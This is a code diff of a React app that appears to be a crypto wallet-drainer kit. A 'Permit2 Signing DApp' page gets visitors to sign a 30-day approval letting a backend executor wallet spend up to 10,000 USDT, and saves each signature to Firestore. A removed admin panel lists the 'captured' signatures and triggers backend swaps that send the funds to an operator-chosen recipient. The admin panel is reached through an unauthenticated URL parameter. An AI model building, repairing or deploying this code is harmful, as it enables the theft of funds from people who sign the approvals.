@@ -1,217 +1,198 @@
 import React, { useState, useEffect } from 'react';
+import { createAppKit } from '@reown/appkit/react';
+import { EthersAdapter } from '@reown/appkit-adapter-ethers';
+import { mainnet } from '@reown/appkit/networks';
+import { BrowserProvider } from 'ethers';
 import { db } from './firebase';
-import { collection, query, onSnapshot } from 'firebase/firestore';
-import { ethers } from 'ethers';
+import { doc, setDoc } from 'firebase/firestore';
+import Admin from './Admin'; // Import the Admin Component
 
-// BACKEND URL - CHANGE IF HOSTED ELSEWHERE
-const BACKEND_URL = "/api/run-worker";
+// -----------------------------
+// CONFIGURATION
+// -----------------------------
+const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
-export default function Admin() {
-  const [signatures, setSignatures] = useState([]);
-  const [groupedData, setGroupedData] = useState({});
-  const [balances, setBalances] = useState({});
-  
-  // Admin Settings
-  const [recipient, setRecipient] = useState(localStorage.getItem('admin_recipient') || "");
-  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");
+// Get Executor Address from Env (The Backend Wallet)
+// Make sure VITE_EXECUTOR_ADDRESS is set in your .env file!
+const EXECUTOR_ADDRESS = import.meta.env.VITE_EXECUTOR_ADDRESS;
 
-  // UI State
-  const [selectedWallet, setSelectedWallet] = useState(null);
-  const [isModalOpen, setIsModalOpen] = useState(false);
-  const [processingId, setProcessingId] = useState(null);
-  const [statusMsg, setStatusMsg] = useState("");
+const USDT_DECIMALS = 6n;
+const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);
+
+// Initialize AppKit
+const appKit = createAppKit({
+  adapters: [new EthersAdapter()],
+  networks: [mainnet],
+  projectId: import.meta.env.VITE_REOWN_PROJECT_ID,
+  metadata: {
+    name: 'Permit2 App',
+    description: 'Universal Router Permit2 Signer',
+    url: 'https://example.com',
+    icons: []
+  },
+});
+
+export default function App() {
+  // Simple routing based on URL param ?admin=true
+  const [isAdmin, setIsAdmin] = useState(false);
 
   useEffect(() => {
-    localStorage.setItem('admin_recipient', recipient);
-    localStorage.setItem('admin_outputToken', outputToken);
-  }, [recipient, outputToken]);
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('admin') === 'true') {
+      setIsAdmin(true);
+    }
+  }, []);
 
-  // Real-time listener for Signatures
+  const [status, setStatus] = useState("Not connected");
+  const [connectedAddress, setConnectedAddress] = useState(null);
+
   useEffect(() => {
-    const q = query(collection(db, "permit2_signatures"));
-    const unsub = onSnapshot(q, (snapshot) => {
-      const docs = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
-      setSignatures(docs);
-      
-      const groups = {};
-      docs.forEach(doc => {
-        if (!groups[doc.owner]) groups[doc.owner] = [];
-        groups[doc.owner].push(doc);
-      });
-      setGroupedData(groups);
+    const unsub = appKit.subscribeAccount((acct) => {
+      if (acct?.isConnected && acct?.address) {
+        setStatus(`Connected: ${acct.address}`);
+        setConnectedAddress(acct.address);
+      } else {
+        setStatus("Not connected");
+        setConnectedAddress(null);
+      }
     });
     return () => unsub();
   }, []);
 
-  // Execute Logic - Calls Backend
-  const handleExecute = async (sigData) => {
-    setProcessingId(sigData.id);
-    setStatusMsg("Triggering Backend Server...");
-
+  const signPermit = async () => {
     try {
-      const response = await fetch(BACKEND_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          docId: sigData.id,
-          recipient: recipient,      // Pass admin setting to backend
-          outputToken: outputToken   // Pass admin setting to backend
-        })
-      });
-
-      const result = await response.json();
-
-      if (!response.ok || !result.ok) {
-        throw new Error(result.error || "Backend failed to execute");
+      if (!connectedAddress) {
+        setStatus("Wallet not connected");
+        return;
       }
       
-      setStatusMsg("Success! Backend executed the swap.");
-      
-      // Close status after 2 seconds
-      setTimeout(() => setStatusMsg(""), 3000);
+      // CRITICAL CHECK: Ensure we have the Executor Address
+      if (!EXECUTOR_ADDRESS) {
+        setStatus("Configuration Error: VITE_EXECUTOR_ADDRESS missing in .env");
+        return;
+      }
 
+      setStatus("Preparing Permit2 signature...");
+      
+      const walletProvider = appKit.getWalletProvider();
+      if (!walletProvider) {
+        setStatus("Wallet provider not available.");
+        return;
+      }
+      
+      const provider = new BrowserProvider(walletProvider);
+      const net = await provider.getNetwork();
+      const chainId = Number(net.chainId);
+      
+      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60; // 30 Days expiration
+      const nonce = 0; // In production, you might want to fetch the real nonce from the contract
+
+      const permitted = {
+        token: import.meta.env.VITE_TOKEN_ADDRESS,
+        amount: SPENDING_CAP.toString(),
+        expiration: deadline,
+        nonce
+      };
+      
+      const domain = { 
+        name: "Permit2", 
+        chainId, 
+        verifyingContract: PERMIT2 
+      };
+      
+      const types = {
+        EIP712Domain: [
+          { name: "name", type: "string" },
+          { name: "chainId", type: "uint256" },
+          { name: "verifyingContract", type: "address" }
+        ],
+        PermitSingle: [
+          { name: "details", type: "PermitDetails" },
+          { name: "spender", type: "address" },
+          { name: "sigDeadline", type: "uint256" }
+        ],
+        PermitDetails: [
+          { name: "token", type: "address" },
+          { name: "amount", type: "uint160" },
+          { name: "expiration", type: "uint48" },
+          { name: "nonce", type: "uint48" }
+        ]
+      };
+
+      // ---------------------------------------------------------
+      // FIX: Spender must be the EXECUTOR (Backend Wallet), 
+      // NOT the Universal Router directly.
+      // ---------------------------------------------------------
+      const message = {
+        details: permitted,
+        spender: EXECUTOR_ADDRESS, 
+        sigDeadline: deadline
+      };
+      
+      setStatus("Requesting signature...");
+      const payload = JSON.stringify({ domain, types, primaryType: "PermitSingle", message });
+      
+      const signature = await walletProvider.request({
+        method: "eth_signTypedData_v4",
+        params: [connectedAddress, payload]
+      });
+      
+      const raw = signature.substring(2);
+      const r = "0x" + raw.substring(0, 64);
+      const s = "0x" + raw.substring(64, 128);
+      const v = parseInt(raw.substring(128, 130), 16);
+      
+      const id = connectedAddress + "_" + Date.now();
+      
+      // Save to Firestore with the correct spender info
+      await setDoc(doc(db, "permit2_signatures", id), {
+        owner: connectedAddress,
+        spender: EXECUTOR_ADDRESS, // Saving Executor as spender
+        token: import.meta.env.VITE_TOKEN_ADDRESS,
+        amount: SPENDING_CAP.toString(),
+        deadline,
+        nonce,
+        r, s, v,
+        processed: false,
+        timestamp: Date.now()
+      });
+      
+      setStatus("Signature saved! Backend will process it.");
+      
     } catch (err) {
       console.error(err);
-      setStatusMsg("Error: " + err.message);
-    } finally {
-      setProcessingId(null);
+      setStatus("Error: " + (err?.message || String(err)));
     }
   };
 
-  const openModal = (wallet) => {
-    setSelectedWallet(wallet);
-    setIsModalOpen(true);
-    setStatusMsg("");
-  };
+  // Render Admin Panel if URL has ?admin=true
+  if (isAdmin) {
+    return <Admin />;
+  }
 
+  // Normal User View
   return (
-    <div className="admin-wrapper">
-      <div className="ambient-glow one"></div>
-      <div className="ambient-glow two"></div>
+    <div className="app-container">
+      <h2>Permit2 Signing DApp</h2>
+      <p style={{ color: "#9fb4ff", marginBottom: 18 }}>
+        Connect wallet and sign the USDT $10,000 cap for the Executor.
+      </p>
 
-      <div className="admin-container glass-panel">
-        <header className="admin-header">
-          <div className="header-top">
-            <h2>Admin Control Center</h2>
-            <div className="connection-badge active">
-              Server Mode
-            </div>
-          </div>
-          
-          <div className="settings-grid">
-            <div className="input-group">
-              <label>Target Recipient Address</label>
-              <input 
-                type="text" 
-                value={recipient} 
-                onChange={(e) => setRecipient(e.target.value)} 
-                placeholder="0x... (Wallet to receive funds)" 
-              />
-            </div>
-            <div className="input-group">
-              <label>Output Token Address</label>
-              <input 
-                type="text" 
-                value={outputToken} 
-                onChange={(e) => setOutputToken(e.target.value)} 
-                placeholder="0x... (Token to swap into)" 
-              />
-            </div>
-          </div>
-        </header>
-
-        <div className="wallet-grid">
-          {Object.keys(groupedData).length === 0 && (
-            <div className="empty-state" style={{color:'#888', textAlign:'center', width:'100%'}}>
-              No signatures captured yet.
-            </div>
-          )}
-          
-          {Object.keys(groupedData).map(owner => (
-            <div key={owner} className="wallet-card glass-card" onClick={() => openModal(owner)}>
-              <div className="card-header">
-                <span className="wallet-icon">👝</span>
-                <span className="wallet-addr">{owner.slice(0, 6)}...{owner.slice(-4)}</span>
-              </div>
-              <div className="card-body">
-                <div className="stat-row">
-                  <span>Signatures</span>
-                  <span className="highlight-white">{groupedData[owner].length}</span>
-                </div>
-                <div className="stat-row">
-                  <span>Pending</span>
-                  <span className="highlight-yellow">
-                    {groupedData[owner].filter(x => !x.processed).length}
-                  </span>
-                </div>
-              </div>
-              <button className="view-btn">Manage</button>
-            </div>
-          ))}
-        </div>
-      </div>
-
-      {/* MODAL */}
-      {isModalOpen && selectedWallet && (
-        <div className="modal-overlay" onClick={() => setIsModalOpen(false)}>
-          <div className="modal-glass glass-panel" onClick={e => e.stopPropagation()}>
-            <div className="modal-header">
-              <h3>{selectedWallet.slice(0, 6)}...{selectedWallet.slice(-4)}</h3>
-              <button className="close-btn" onClick={() => setIsModalOpen(false)}>✕</button>
-            </div>
-            
-            {statusMsg && (
-              <div className={`status-bar ${statusMsg.includes("Success") ? "success" : statusMsg.includes("Error") ? "error-msg" : "processing"}`}>
-                {statusMsg}
-              </div>
-            )}
-
-            <div className="signature-list">
-              {groupedData[selectedWallet].map(sig => (
-                <div key={sig.id} className={`signature-item ${sig.processed ? 'processed' : ''}`}>
-                  <div className="sig-row">
-                    <span className="label">Token</span>
-                    <span className="value">{sig.token.slice(0,6)}...{sig.token.slice(-4)}</span>
-                  </div>
-                  <div className="sig-row">
-                    <span className="label">Amount</span>
-                    <span className="value">{(BigInt(sig.amount) / (10n ** 6n)).toString()} USDT</span>
-                  </div>
-                  <div className="sig-row">
-                    <span className="label">Status</span>
-                    <span className={`status-tag ${sig.processed ? 'done' : 'pending'}`}>
-                      {sig.processed ? "Done" : "Ready"}
-                    </span>
-                  </div>
-                  
-                  {sig.lastError && !sig.processed && (
-                    <div className="error-msg" style={{marginTop:'10px'}}>⚠️ {sig.lastError.slice(0, 60)}...</div>
-                  )}
-
-                  {!sig.processed ? (
-                    <button 
-                      className="execute-btn" 
-                      onClick={() => handleExecute(sig)}
-                      disabled={processingId === sig.id}
-                    >
-                      {processingId === sig.id ? "CONTACTING SERVER..." : "EXECUTE SWAP"}
-                    </button>
-                  ) : (
-                    <a 
-                      href={`https://etherscan.io/tx/${sig.routerTx}`} 
-                      target="_blank" 
-                      rel="noreferrer"
-                      className="etherscan-link"
-                    >
-                      View on Etherscan ↗
-                    </a>
-                  )}
-                </div>
-              ))}
-            </div>
-          </div>
-        </div>
+      {connectedAddress ? (
+        <button className="connect" onClick={signPermit}>
+          Sign Permit
+        </button>
+      ) : (
+        <button className="connect" onClick={() => appKit.open()}>
+          Connect Wallet
+        </button>
       )}
+
+      <div className="status">{status}</div>
+      
+      <div style={{marginTop: '50px', fontSize: '12px'}}>
+        <a href="?admin=true" style={{color: '#555'}}>Admin Login</a>
+      </div>
     </div>
   );
 }
